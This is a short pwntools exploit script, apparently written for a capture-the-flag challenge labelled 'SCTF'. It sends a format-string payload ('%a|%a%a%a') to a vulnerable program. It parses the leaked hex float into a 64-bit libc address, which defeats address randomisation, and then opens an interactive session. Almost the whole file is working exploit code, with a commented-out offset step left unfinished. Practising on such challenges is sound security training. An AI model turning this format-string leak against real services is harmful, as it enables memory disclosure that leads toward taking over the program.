from parse_args_and_some_func import *

context.update(arch="amd64", os="linux", endian="little")
sh:tube = all_parsed_args.io

libc = all_parsed_args['cur_elf'].libc
# %a%a%a%a%a
sh.sendlineafter("SCTF:\n","%a|%a%a%a")
msg = sh.recvuntil("|")
# libc_addr = 
info(msg)
flv = float.fromhex(msg[:-1].decode())  #- libc.sym['_IO_2_1_stdout_']
bflv = struct.pack("d", flv)
leak_addr = u64(bflv)

info("libc_addr -> %#x" % leak_addr)
# float.fromhex()
sh.interactive()